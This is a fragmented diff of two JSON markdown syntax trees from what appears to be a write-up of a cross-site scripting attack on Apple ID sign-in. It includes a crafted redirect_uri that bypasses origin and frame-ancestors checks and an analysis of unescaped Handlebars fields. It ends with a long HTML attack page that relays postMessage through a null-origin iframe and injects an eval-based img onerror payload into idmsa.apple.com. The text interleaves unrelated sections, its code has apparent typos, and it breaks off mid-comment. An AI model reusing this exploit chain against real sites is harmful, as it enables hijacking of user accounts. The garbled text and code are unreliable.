<               "column": 124,
<               "offset": 51498
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "inlineCode",
<           "value": "https%3A%2F%2Fs3-eu-west-1.amazonaws.com%253F%20s3-eu-west-1.amazonaws.com%3B%40www.icloud.com",
<           "position": {
<             "start": {
<               "line": 1037,
<               "column": 124,
<               "offset": 51498
<             },
<             "end": {
<               "line": 1037,
<               "column": 220,
<               "offset": 51594
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "text",
<           "value": ".",
<           "position": {
<             "start": {
<               "line": 1037,
<               "column": 220,
<               "offset": 51594
<             },
<             "end": {
<               "line": 1037,
<               "column": 221,
<               "offset": 51595
<             },
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1037,
<           "column": 1,
<           "offset": 51375
<         },
<         "end": {
<           "line": 1037,
<           "column": 221,
<           "offset": 51595
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "paragraph",
<       "children": [
<         {
<           "type": "text",
<           "value": "This is a very tricky URL to construct, as it has to satisfy all systems without crashing, and it does, as follows:",
<           "position": {
<             "start": {
<               "line": 1039,
<               "column": 1,
<               "offset": 51599
<             },
<             "end": {
<               "line": 1039,
<               "column": 116,
<               "offset": 51714
18255,18283d20759
<             "indent": []
<           }
<         }
<       ],
<       "position": {
<         "start": {
<           "line": 1039,
<           "column": 1,
<           "offset": 51599
<         },
<         "end": {
<           "line": 1039,
<           "column": 116,
<           "offset": 51714
<         },
<         "indent": []
<       }
<     },
<     {
<       "type": "list",
<       "ordered": true,
<       "start": 1,
<       "spread": false,
<       "children": [
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
18289c20765
<                   "value": "The Apple ID backend at ",
---
>                   "value": "This is a Handlebars template. It's kinda funny to see a handlebars template in 2019. Handlebars.js was one of the first 'Web 2.0' libraries. If you look up its website it's full of 2010s design choices -- soft rounded corners and lots of negative space. Things that were only just becoming possible with modern CSS.",
18292,18294c20768,20770
<                       "line": 1041,
<                       "column": 4,
<                       "offset": 51721
---
>                       "line": 1122,
>                       "column": 1,
>                       "offset": 58934
18297,18299c20773,20775
<                       "line": 1041,
<                       "column": 28,
<                       "offset": 51745
---
>                       "line": 1122,
>                       "column": 317,
>                       "offset": 59250
18302a20779,20785
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 1122,
>                   "column": 1,
>                   "offset": 58934
18304,18319c20787,20790
<                 {
<                   "type": "inlineCode",
<                   "value": "idmsa.apple.com",
<                   "position": {
<                     "start": {
<                       "line": 1041,
<                       "column": 28,
<                       "offset": 51745
<                     },
<                     "end": {
<                       "line": 1041,
<                       "column": 45,
<                       "offset": 51762
<                     },
<                     "indent": []
<                   }
---
>                 "end": {
>                   "line": 1122,
>                   "column": 317,
>                   "offset": 59250
18320a20792,20797
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
18323c20800
<                   "value": "\ndecodes the ",
---
>                   "value": "Handlebars templates pre-date 'taint' based HTML escaping. If you use, say, Go's HTML templating system your injected content will ",
18326,18328c20803,20805
<                       "line": 1041,
<                       "column": 45,
<                       "offset": 51762
---
>                       "line": 1124,
>                       "column": 1,
>                       "offset": 59254
18331,18333c20808,20810
<                       "line": 1042,
<                       "column": 13,
<                       "offset": 51776
---
>                       "line": 1124,
>                       "column": 132,
>                       "offset": 59385
18335,18337c20812
<                     "indent": [
<                       1
<                     ]
---
>                     "indent": []
18341,18342c20816,20835
<                   "type": "inlineCode",
<                   "value": "redirect_uri",
---
>                   "type": "emphasis",
>                   "children": [
>                     {
>                       "type": "text",
>                       "value": "always",
>                       "position": {
>                         "start": {
>                           "line": 1124,
>                           "column": 133,
>                           "offset": 59386
>                         },
>                         "end": {
>                           "line": 1124,
>                           "column": 139,
>                           "offset": 59392
>                         },
>                         "indent": []
>                       }
>                     }
>                   ],
18345,18347c20838,20840
<                       "line": 1042,
<                       "column": 13,
<                       "offset": 51776
---
>                       "line": 1124,
>                       "column": 132,
>                       "offset": 59385
18350,18352c20843,20845
<                       "line": 1042,
<                       "column": 27,
<                       "offset": 51790
---
>                       "line": 1124,
>                       "column": 140,
>                       "offset": 59393
18359c20852
<                   "value": " ‘",
---
>                   "value": " be safely escaped away unless you explicitly whitelist the input by asserting the string as a ",
18362,18364c20855,20857
<                       "line": 1042,
<                       "column": 27,
<                       "offset": 51790
---
>                       "line": 1124,
>                       "column": 140,
>                       "offset": 59393
18367,18369c20860,20862
<                       "line": 1042,
<                       "column": 29,
<                       "offset": 51792
---
>                       "line": 1124,
>                       "column": 235,
>                       "offset": 59488
18376c20869
<                   "value": "https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com",
---
>                   "value": "template.HTML()",
18379,18381c20872,20874
<                       "line": 1042,
<                       "column": 29,
<                       "offset": 51792
---
>                       "line": 1124,
>                       "column": 235,
>                       "offset": 59488
18384,18386c20877,20879
<                       "line": 1042,
<                       "column": 111,
<                       "offset": 51874
---
>                       "line": 1124,
>                       "column": 252,
>                       "offset": 59505
18393c20886
<                   "value": "’",
---
>                   "value": " type.",
18396,18398c20889,20891
<                       "line": 1042,
<                       "column": 111,
<                       "offset": 51874
---
>                       "line": 1124,
>                       "column": 252,
>                       "offset": 59505
18401,18403c20894,20896
<                       "line": 1042,
<                       "column": 112,
<                       "offset": 51875
---
>                       "line": 1124,
>                       "column": 258,
>                       "offset": 59511
18411,18413c20904,20906
<                   "line": 1041,
<                   "column": 4,
<                   "offset": 51721
---
>                   "line": 1124,
>                   "column": 1,
>                   "offset": 59254
18416,18418c20909,20911
<                   "line": 1042,
<                   "column": 112,
<                   "offset": 51875
---
>                   "line": 1124,
>                   "column": 258,
>                   "offset": 59511
18420,18422c20913
<                 "indent": [
<                   1
<                 ]
---
>                 "indent": []
18424,18435d20914
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1041,
<               "column": 1,
<               "offset": 51718
<             },
<             "end": {
<               "line": 1042,
<               "column": 112,
<               "offset": 51875
18437,18446d20915
<             "indent": [
<               1
<             ]
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
18452,18486c20921
<                   "value": "It (correctly) determines that the origin is ",
<                   "position": {
<                     "start": {
<                       "line": 1043,
<                       "column": 4,
<                       "offset": 51880
<                     },
<                     "end": {
<                       "line": 1043,
<                       "column": 49,
<                       "offset": 51925
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "inlineCode",
<                   "value": "wwww.icloud.com",
<                   "position": {
<                     "start": {
<                       "line": 1043,
<                       "column": 49,
<                       "offset": 51925
<                     },
<                     "end": {
<                       "line": 1043,
<                       "column": 66,
<                       "offset": 51942
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "text",
<                   "value": " and allows the request through.",
---
>                   "value": "Handlebars decides whether to safely escape content or not based on the number of 'handlebars' around the input, which is a fantastic way to make it really easy for machines to determine if you messed up, but very difficult for human software engineers.",
18489,18491c20924,20926
<                       "line": 1043,
<                       "column": 66,
<                       "offset": 51942
---
>                       "line": 1126,
>                       "column": 1,
>                       "offset": 59515
18494,18496c20929,20931
<                       "line": 1043,
<                       "column": 98,
<                       "offset": 51974
---
>                       "line": 1126,
>                       "column": 254,
>                       "offset": 59768
18504,18506c20939,20941
<                   "line": 1043,
<                   "column": 4,
<                   "offset": 51880
---
>                   "line": 1126,
>                   "column": 1,
>                   "offset": 59515
18509,18511c20944,20946
<                   "line": 1043,
<                   "column": 98,
<                   "offset": 51974
---
>                   "line": 1126,
>                   "column": 254,
>                   "offset": 59768
18515,18526d20949
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1043,
<               "column": 1,
<               "offset": 51877
<             },
<             "end": {
<               "line": 1043,
<               "column": 98,
<               "offset": 51974
18528,18535d20950
<             "indent": []
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
18541c20956
<                   "value": "The Apple ID backend at ",
---
>                   "value": "A safe handlebars template string looks like ",
18544,18546c20959,20961
<                       "line": 1044,
<                       "column": 4,
<                       "offset": 51979
---
>                       "line": 1128,
>                       "column": 1,
>                       "offset": 59772
18549,18551c20964,20966
<                       "line": 1044,
<                       "column": 28,
<                       "offset": 52003
---
>                       "line": 1128,
>                       "column": 46,
>                       "offset": 59817
18558c20973
<                   "value": "idmsa.apple.com",
---
>                   "value": "{{rememberMeLabel}}",
18561,18563c20976,20978
<                       "line": 1044,
<                       "column": 28,
<                       "offset": 52003
---
>                       "line": 1128,
>                       "column": 46,
>                       "offset": 59817
18566,18568c20981,20983
<                       "line": 1044,
<                       "column": 45,
<                       "offset": 52020
---
>                       "line": 1128,
>                       "column": 67,
>                       "offset": 59838
18575c20990
<                   "value": " returns the Content-Security Policy directive ‘",
---
>                   "value": " and a potentially catastrophically unsafe one looks like ",
18578,18580c20993,20995
<                       "line": 1044,
<                       "column": 45,
<                       "offset": 52020
---
>                       "line": 1128,
>                       "column": 67,
>                       "offset": 59838
18583,18585c20998,21000
<                       "line": 1044,
<                       "column": 93,
<                       "offset": 52068
---
>                       "line": 1128,
>                       "column": 125,
>                       "offset": 59896
18592c21007
<                   "value": "frame-ancestors https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com",
---
>                   "value": "{{{rememberMeLabel}}}",
18595,18597c21010,21012
<                       "line": 1044,
<                       "column": 93,
<                       "offset": 52068
---
>                       "line": 1128,
>                       "column": 125,
>                       "offset": 59896
18600,18602c21015,21017
<                       "line": 1044,
<                       "column": 191,
<                       "offset": 52166
---
>                       "line": 1128,
>                       "column": 148,
>                       "offset": 59919
18609c21024
<                   "value": "’",
---
>                   "value": ". That's kinda hard to notice!",
18612,18614c21027,21029
<                       "line": 1044,
<                       "column": 191,
<                       "offset": 52166
---
>                       "line": 1128,
>                       "column": 148,
>                       "offset": 59919
18617,18619c21032,21034
<                       "line": 1044,
<                       "column": 192,
<                       "offset": 52167
---
>                       "line": 1128,
>                       "column": 178,
>                       "offset": 59949
18627,18629c21042,21044
<                   "line": 1044,
<                   "column": 4,
<                   "offset": 51979
---
>                   "line": 1128,
>                   "column": 1,
>                   "offset": 59772
18632,18634c21047,21049
<                   "line": 1044,
<                   "column": 192,
<                   "offset": 52167
---
>                   "line": 1128,
>                   "column": 178,
>                   "offset": 59949
18638,18649d21052
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1044,
<               "column": 1,
<               "offset": 51976
<             },
<             "end": {
<               "line": 1044,
<               "column": 192,
<               "offset": 52167
18651,18658d21053
<             "indent": []
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
18664c21059
<                   "value": "This indicates to the browser the allowed origins ",
---
>                   "value": "A quick and simple ctrl-f in the ",
18667,18669c21062,21064
<                       "line": 1045,
<                       "column": 4,
<                       "offset": 52172
---
>                       "line": 1130,
>                       "column": 1,
>                       "offset": 59953
18672,18674c21067,21069
<                       "line": 1045,
<                       "column": 54,
<                       "offset": 52222
---
>                       "line": 1130,
>                       "column": 34,
>                       "offset": 59986
18681c21076
<                   "value": "https://s3-eu-west-1.amazonaws.com%3F",
---
>                   "value": "signin",
18684,18686c21079,21081
<                       "line": 1045,
<                       "column": 54,
<                       "offset": 52222
---
>                       "line": 1130,
>                       "column": 34,
>                       "offset": 59986
18689,18691c21084,21086
<                       "line": 1045,
<                       "column": 93,
<                       "offset": 52261
---
>                       "line": 1130,
>                       "column": 42,
>                       "offset": 59994
18698c21093
<                   "value": ", which doesn't exist and ",
---
>                   "value": " HTML gets us this:",
18701,18703c21096,21098
<                       "line": 1045,
<                       "column": 93,
<                       "offset": 52261
---
>                       "line": 1130,
>                       "column": 42,
>                       "offset": 59994
18706,18708c21101,21103
<                       "line": 1045,
<                       "column": 119,
<                       "offset": 52287
---
>                       "line": 1130,
>                       "column": 61,
>                       "offset": 60013
18711a21107,21137
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 1130,
>                   "column": 1,
>                   "offset": 59953
>                 },
>                 "end": {
>                   "line": 1130,
>                   "column": 61,
>                   "offset": 60013
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "HTML",
>               "meta": null,
>               "value": "<p class=\"sr-only\" id=\"invalidUserNamePwdErrMsg\" role=\"tooltip\">\n    {{{errorMessage}}}\n</p>\n</div>",
>               "position": {
>                 "start": {
>                   "line": 1132,
>                   "column": 1,
>                   "offset": 60017
>                 },
>                 "end": {
>                   "line": 1137,
>                   "column": 4,
>                   "offset": 60133
18712a21139,21150
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
18714,18715c21152,21153
<                   "type": "inlineCode",
<                   "value": "s3-eu-west-1.amazonaws.com",
---
>                   "type": "text",
>                   "value": "First hit is not so promising. The error message is unescaped, sure but they're usually generated from either a static, hard-coded list of HTML error strings, or something returned from a server we can't manipulate.",
18718,18720c21156,21158
<                       "line": 1045,
<                       "column": 119,
<                       "offset": 52287
---
>                       "line": 1139,
>                       "column": 1,
>                       "offset": 60137
18723,18725c21161,21163
<                       "line": 1045,
<                       "column": 147,
<                       "offset": 52315
---
>                       "line": 1139,
>                       "column": 216,
>                       "offset": 60352
18728a21167,21197
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 1139,
>                   "column": 1,
>                   "offset": 60137
>                 },
>                 "end": {
>                   "line": 1139,
>                   "column": 216,
>                   "offset": 60352
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "HTML",
>               "meta": null,
>               "value": "    {{#if showLearnMoreLink}}\n    <div>\n        {{{learnMoreLink}}}\n    </div>\n    {{/if}}\n    {{#if showPrivacy}}\n    <div  class=\"label-small text-centered centered tk-caption privacy-wrapper\">\n            <div class=\"privacy-icon\"></div>\n            {{{privacyText}}} \n    </div>\n    {{/if}}",
>               "position": {
>                 "start": {
>                   "line": 1141,
>                   "column": 1,
>                   "offset": 60356
>                 },
>                 "end": {
>                   "line": 1153,
>                   "column": 4,
>                   "offset": 60674
18729a21199,21217
>                 "indent": [
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1,
>                   1
>                 ]
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
18732c21220
<                   "value": " which is ",
---
>                   "value": "Oh now this looks ",
18735,18737c21223,21225
<                       "line": 1045,
<                       "column": 147,
<                       "offset": 52315
---
>                       "line": 1155,
>                       "column": 1,
>                       "offset": 60678
18740,18742c21228,21230
<                       "line": 1045,
<                       "column": 157,
<                       "offset": 52325
---
>                       "line": 1155,
>                       "column": 19,
>                       "offset": 60696
18752c21240
<                       "value": "anything we put in our personal S3 bucket web server",
---
>                       "value": "really",
18755,18757c21243,21245
<                           "line": 1045,
<                           "column": 158,
<                           "offset": 52326
---
>                           "line": 1155,
>                           "column": 20,
>                           "offset": 60697
18760,18762c21248,21250
<                           "line": 1045,
<                           "column": 210,
<                           "offset": 52378
---
>                           "line": 1155,
>                           "column": 26,
>                           "offset": 60703
18770,18772c21258,21260
<                       "line": 1045,
<                       "column": 157,
<                       "offset": 52325
---
>                       "line": 1155,
>                       "column": 19,
>                       "offset": 60696
18775,18777c21263,21265
<                       "line": 1045,
<                       "column": 211,
<                       "offset": 52379
---
>                       "line": 1155,
>                       "column": 27,
>                       "offset": 60704
18784c21272
<                   "value": ".",
---
>                   "value": " good! From our previous code we already know that ",
18787,18789c21275,21277
<                       "line": 1045,
<                       "column": 211,
<                       "offset": 52379
---
>                       "line": 1155,
>                       "column": 27,
>                       "offset": 60704
18792,18794c21280,21282
<                       "line": 1045,
<                       "column": 212,
<                       "offset": 52380
---
>                       "line": 1155,
>                       "column": 78,
>                       "offset": 60755
18798,18809d21285
<                 }
<               ],
<               "position": {
<                 "start": {
<                   "line": 1045,
<                   "column": 4,
<                   "offset": 52172
<                 },
<                 "end": {
<                   "line": 1045,
<                   "column": 212,
<                   "offset": 52380
18811,18836d21286
<                 "indent": []
<               }
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1045,
<               "column": 1,
<               "offset": 52169
<             },
<             "end": {
<               "line": 1045,
<               "column": 212,
<               "offset": 52380
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
<             {
<               "type": "paragraph",
<               "children": [
18839c21289
<                   "value": "idmsa.apple.com",
---
>                   "value": "privacyText",
18842,18844c21292,21294
<                       "line": 1046,
<                       "column": 4,
<                       "offset": 52385
---
>                       "line": 1155,
>                       "column": 78,
>                       "offset": 60755
18847,18849c21297,21299
<                       "line": 1046,
<                       "column": 21,
<                       "offset": 52402
---
>                       "line": 1155,
>                       "column": 91,
>                       "offset": 60768
18856c21306
<                   "value": " then generates ",
---
>                   "value": " is derived from ",
18859,18861c21309,21311
<                       "line": 1046,
<                       "column": 21,
<                       "offset": 52402
---
>                       "line": 1155,
>                       "column": 91,
>                       "offset": 60768
18864,18866c21314,21316
<                       "line": 1046,
<                       "column": 37,
<                       "offset": 52418
---
>                       "line": 1155,
>                       "column": 108,
>                       "offset": 60785
18873c21323
<                   "value": "bootData.destinationDomain = decodeURIComponent('https://s3-eu-west-1.amazonaws.com%3F s3-eu-west-1.amazonaws.com;@www.icloud.com)",
---
>                   "value": "envConfigFromConsumer.privacy",
18876,18878c21326,21328
<                       "line": 1046,
<                       "column": 37,
<                       "offset": 52418
---
>                       "line": 1155,
>                       "column": 108,
>                       "offset": 60785
18881,18883c21331,21333
<                       "line": 1046,
<                       "column": 169,
<                       "offset": 52550
---
>                       "line": 1155,
>                       "column": 139,
>                       "offset": 60816
18890c21340
<                   "value": ". ",
---
>                   "value": ". Same for ",
18893,18895c21343,21345
<                       "line": 1046,
<                       "column": 169,
<                       "offset": 52550
---
>                       "line": 1155,
>                       "column": 139,
>                       "offset": 60816
18898,18900c21348,21350
<                       "line": 1046,
<                       "column": 171,
<                       "offset": 52552
---
>                       "line": 1155,
>                       "column": 150,
>                       "offset": 60827
18907c21357
<                   "value": "bootData.destinationDomain",
---
>                   "value": "learnMoreLink",
18910,18912c21360,21362
<                       "line": 1046,
<                       "column": 171,
<                       "offset": 52552
---
>                       "line": 1155,
>                       "column": 150,
>                       "offset": 60827
18915,18917c21365,21367
<                       "line": 1046,
<                       "column": 199,
<                       "offset": 52580
---
>                       "line": 1155,
>                       "column": 165,
>                       "offset": 60842
18924c21374
<                   "value": " gets set to ‘",
---
>                   "value": ", but there's no need to try ",
18927,18929c21377,21379
<                       "line": 1046,
<                       "column": 199,
<                       "offset": 52580
---
>                       "line": 1155,
>                       "column": 165,
>                       "offset": 60842
18932,18934c21382,21384
<                       "line": 1046,
<                       "column": 213,
<                       "offset": 52594
---
>                       "line": 1155,
>                       "column": 194,
>                       "offset": 60871
18941,18958c21391
<                   "value": "https://s3-eu-west-1.amazonaws.com? s3-eu-west-1.amazonaws.com;@www.icloud.com",
<                   "position": {
<                     "start": {
<                       "line": 1046,
<                       "column": 213,
<                       "offset": 52594
<                     },
<                     "end": {
<                       "line": 1046,
<                       "column": 293,
<                       "offset": 52674
<                     },
<                     "indent": []
<                   }
<                 },
<                 {
<                   "type": "text",
<                   "value": "’ when the page loads.",
---
>                   "value": "learnMoreLink",
18961,18963c21394,21396
<                       "line": 1046,
<                       "column": 293,
<                       "offset": 52674
---
>                       "line": 1155,
>                       "column": 194,
>                       "offset": 60871
18966,18968c21399,21401
<                       "line": 1046,
<                       "column": 315,
<                       "offset": 52696
---
>                       "line": 1155,
>                       "column": 209,
>                       "offset": 60886
18972,18978d21404
<                 }
<               ],
<               "position": {
<                 "start": {
<                   "line": 1046,
<                   "column": 4,
<                   "offset": 52385
18980,19010d21405
<                 "end": {
<                   "line": 1046,
<                   "column": 315,
<                   "offset": 52696
<                 },
<                 "indent": []
<               }
<             }
<           ],
<           "position": {
<             "start": {
<               "line": 1046,
<               "column": 1,
<               "offset": 52382
<             },
<             "end": {
<               "line": 1046,
<               "column": 315,
<               "offset": 52696
<             },
<             "indent": []
<           }
<         },
<         {
<           "type": "listItem",
<           "spread": false,
<           "checked": null,
<           "children": [
<             {
<               "type": "paragraph",
<               "children": [
19013c21408
<                   "value": "When passed ",
---
>                   "value": " if ",
19016,19018c21411,21413
<                       "line": 1047,
<                       "column": 4,
<                       "offset": 52701
---
>                       "line": 1155,
>                       "column": 209,
>                       "offset": 60886
19021,19023c21416,21418
<                       "line": 1047,
<                       "column": 16,
<                       "offset": 52713
---
>                       "line": 1155,
>                       "column": 213,
>                       "offset": 60890
19030c21425
<                   "value": "https://s3-eu-west-1.amazonaws.com? s3-eu-west-1.amazonaws.com;@www.icloud.com",
---
>                   "value": "privacyText",
19033,19035c21428,21430
<                       "line": 1047,
<                       "column": 16,
<                       "offset": 52713
---
>                       "line": 1155,
>                       "column": 213,
>                       "offset": 60890
19038,19040c21433,21435
<                       "line": 1047,
<                       "column": 96,
<                       "offset": 52793
---
>                       "line": 1155,
>                       "column": 226,
>                       "offset": 60903
19047c21442
<                   "value": " as ",
---
>                   "value": " already works.",
19050,19052c21445,21447
<                       "line": 1047,
<                       "column": 96,
<                       "offset": 52793
---
>                       "line": 1155,
>                       "column": 226,
>                       "offset": 60903
19055,19057c21450,21452
<                       "line": 1047,
<                       "column": 100,
<                       "offset": 52797
---
>                       "line": 1155,
>                       "column": 241,
>                       "offset": 60918
19060a21456,21467
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 1155,
>                   "column": 1,
>                   "offset": 60678
>                 },
>                 "end": {
>                   "line": 1155,
>                   "column": 241,
>                   "offset": 60918
19061a21469,21474
>                 "indent": []
>               }
>             },
>             {
>               "type": "paragraph",
>               "children": [
19063,19064c21476,21477
<                   "type": "inlineCode",
<                   "value": "targetOrigin",
---
>                   "type": "text",
>                   "value": "Let's put everything together into one attack page.",
19067,19069c21480,21482
<                       "line": 1047,
<                       "column": 100,
<                       "offset": 52797
---
>                       "line": 1157,
>                       "column": 1,
>                       "offset": 60922
19072,19074c21485,21487
<                       "line": 1047,
<                       "column": 114,
<                       "offset": 52811
---
>                       "line": 1157,
>                       "column": 52,
>                       "offset": 60973
19077a21491,21516
>                 }
>               ],
>               "position": {
>                 "start": {
>                   "line": 1157,
>                   "column": 1,
>                   "offset": 60922
>                 },
>                 "end": {
>                   "line": 1157,
>                   "column": 52,
>                   "offset": 60973
>                 },
>                 "indent": []
>               }
>             },
>             {
>               "type": "code",
>               "lang": "HTML",
>               "meta": "CodeCommentHelper=//",
>               "value": "<!DOCTYPE HTML>\n//\n<title>Apple Rewards</title>\n<style type=\"text/css\">\n\n// First, we \n// clear up any gives that there's\n// something going on by making\n// the Apple ID frame fill\n// the whole page with no border\n.idmsa-frame {\n    width: 100vw;\n    height: 100vh;\n    border: 0;\n}\n\n</style>\n\n<script>\n\n// Next, the null origin allows us to bypass\n// Apple ID's postMessage controls.\n// This function takes some code, and\n// runs it in the null origin.\nconst runAsNull = code => {\n    const i = document.createElement(\n        \"iframe\"\n    );\n\n    // We apply 'sandbox=allow-scripts'\n    // to the iframe. Enabling sandboxing\n    // makes our page have the 'null' origin\n    // we need to bypass Apple ID's recieve\n    // postMessage controls.\n    i.setAttribute(\n        \"sandbox\",\n        \"allow-scripts\"\n    );\n\n    // Then, we create an HTML document inside our sandboxed iframe\n    // containing our javascript code.\n    //\n    // Those backtick quotes (`) are just multi-line\n    // quote marks by the way.\n    i.setAttribute(\n        \"srcdoc\",\n        `<!DOCTYPE HTML>\n<title>null origin</title>\n<body><script>(${javascriptCode})()<\\/script></body>\n    `);\n\n\n    // Appends our iframe child, which we called 'i'\n    // to the page's '<body>' element, and gets a handle\n    // on the window the browser made inside the iframe.\n    return document.body\n        .appendChild(i).contentWindow;\n}\n\n\n// This is the code we want to inject into idmsa.apple.com.\n// For now, it's just a pop-up box that says the domain\n// that it's running in.\n//\n// Domains and origins are the fundamental primitives of web\n// security, so if we can open a popup showing 'idmsa.apple.com',\n// we prove to ourselves that we've compromised Apple ID.\nconst injection = () => {\n    alert(document.domain);\n}\n\n\n// This is the page we're embedding and attacking. It needs\n// a bunch of parmeters to work, but we'll probably want\n// to reference those parameters a few times\n// so it's easier to define the components of the URL separately.\nconst idmsa_base =\n    \"https://idmsa.apple.com/appleauth/auth/authorize/signin\";\n\n// Here are the parameters we're using against idmsa_base.\n// defining them like this instead of one long URL\n// makes it easier to programmatically alter these parameters\n// if need to to work on our attack.\nconst idmsa_params = {\n    client_id: \"d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d\",\n\n    // Here, the redirect_uri's ? is pre-urlencoded as mentioned\n    // in previous chapters. This causes it to be misinterpreted\n    // by different parts of the system.\n    redirect_uri: `https://s3-eu-west-1.amazonaws.com${encodeURIComponent(\"?\")} s3-eu-west-1.amazonaws.com;@www.icloud.com`,\n    response_mode: \"web_message\",\n    \n    // I thought it might be possible that this frame_id\n    // needed to change per-request, but it doesn't\n    // so we can just hard code it :)\n    frame_id: \"9d8dafd2-0f8c-4901-ab87-7021ffa6f7ff\",\n    locale: \"en_GB\"\n}\n\n// let's make the idmsa frame.\nconst idmsa_frame = document.createElement(\"iframe\");\n\n// to inherit our CSS class from before\nidmsa_frame.setAttribute(\"class\", \"idmsa\");\n\n// this builds the idmsa url. I apologise for the way I build\n// the url encoding stuff. it reads fine to me but uses\n// a bunch of higher-level javascript concepts that\n// might not make a  whole lot of sense.\nidmsa_frame.src = `${idmsa_base}?${\n    Object.entries(idmsa_params)\n        .map(([key, value]) => \n            [key, value].map(encodeURIComponent).join(\"=\"))\n        .join(\"&\")\n}`;\n\n// our null page needs to:\n//   1.  Wait for a config, and remember it\n//   2. Forward all subsequent postMessages to\n//   idmsa.apple.com.\nconst nullPageCode = () => {\n    // async functions can wait on asynchronous events.\n    // since we're waiting n a bunch of asynchronous\n    // stuff to happen it only makes sense.\n    async function main() {\n        // tell our parent we're ready.\n        // the onLoad events for iframes have always\n        // been finickity. Waiting on a postMessage\n        // is much easier.\n        window.parent.postMessage(\"ready\", \"*\");\n\n        // await lets us wait for events that might\n        // happen in the future before continuing.\n        // we don't want to do anything before we\n        // get the config anyway.\n        //\n        // Promises make fantastic adaptors for turning\n        // old style callbacks into async code.\n        const config = await new Promise((ok, fail) => {\n            console.log(\"waiting for config\");\n            \n            // postMessage's event is just called 'message'\n            // i dont really know why.\n            window.addEventListener('message', ({data}) => {\n                console.log(\"got config message\");\n\n                // honestly receiving the wrong postMessage\n                // can happen pretty easily so it's worth\n                // guarding for to save some painful debug\n                // time.\n                if (data.type != config)\n                    reutrn fail(`did not get config, instead got ${JSON.stringify(data)})`);\n                \n                // this completes the promise.\n                return ok(data);\n            // eventListeners default to firing on all\n            // events but everything would probably break\n            // if we did that with this function.\n            }, { once: true });\n        });\n\n        // extract the idmsaFrameId (of window.top.frames)\n        // for later use.\n        const {idmsaFrameId} = config;\n\n        // now the easy part. we just forward everything\n        // to the idmsa page.\n        window.addEventListener(\"message\", ({data}) => {\n            console.log(\"forwarding to idmsa\", data);\n\n\n            // ordinarily \"*\" would be a bad idea, but because\n            // *we* are the bad guys we don't need to give a\n            // shit about secure coding practices.\n            window.top.frames[idmsaFrameId].postMessage(data, \"*\");\n        });\n\n        // this is just how you execute an async function\n        // without making javascript annoyed at you.\n        main().catch(e => console.error(e));\n    }\n}\n\n\n// next we'll build our config.\n// we're going to go for an <img src=a onerror> XSS,\n// the reason being that due to a totally ineffectual\n// and super old attempt at global XSS mitigation,\n// we can't inject <script> tags and have them\n// run after the page's first load, which will\n// have fired by this time. This is a bypass.\n//\n// We also btoa (base64 encode) our injection code\n// for transit across the postMessage boundary.\n// this is mainly because managing quotation marks\n// in our HTML injection gets really confusing otherwise,\n// since we're already using ' and \" in our <img> code --\n// if these were present in our injection code string, the\n// code would break.\nconst injectionHTML = `<img src=a onerror='eval(atob(\"${\n    bota(`(${injection})()`)\n}\"))' />`;\n\n\n// stolen directly from the known good conversation we eavesdropped on.\n// \"src\" is not actually \"[img src]\" but a good 8000 characters of\n// base64 encoded image data\n// which I omit so as to not make this unreadable.\nconst config_resp = { \"jsonrpc\": \"2.0\", \"id\": \"69B33E61-79C4-4A52-9522-63F273B7C349\", \"result\": { \"data\": { \"features\": { \"rememberMe\": true, \"createLink\": false, \"iForgotLink\": true, \"pause2FA\": false }, \"signInLabel\": \"Sign in to get your free Apple giftcard!\", \"serviceKey\": \"d39ba9916b7251055b22c7f910e2ea796ee65e98b2ddecea8f5dde8d9d1a815d\", \"defaultAccountNameAutoFillDomain\": \"icloud.com\", \"trustTokens\": [], \"rememberMeLabel\": \"keep-me-signed-in\", \"privacy\": injectionHTML, \"theme\": \"dark\", \"waitAnimationOnAuthComplete\": false, \"logo\": { \"src\": \"[img src]\", \"width\": \"100px;color:red\" } } } };\n\n\n// add the null page iframe too our page.\nconst nullPage = runFunctionInNullOrigin(nullPageCode);\n\n// determine which frame is the idmsa frame.\nlet idmsaFrameId;\n\n// there's probably a more elegant way to find what\n// index the idmsa frame is on window.top.frames, but\n// these APIs are so ancient I don't really want to fuck\n// with them and spend ages working out why they won't work.\nfor (let i = 0; i < window.top.frames.length; i++) {\n    if (window.top.frames[i] != idmsa.contentWindow) continue;\n    ifmsaFrameId = i;\n    break\n}\n\n\nwindow.addEventListener(\"message\", e => {\n    console.log(\"RCV\", e);\n\n    // we need to wait for the null page to postMessage\n    // us to tell us it exists. This way of doing it\n    // is ... not entirely kosher but it works for our\n    // purposes.\n    if (e.data == \"ready\") return nullPage.postMessage(config, \"*\");\n\n    // the postmessage 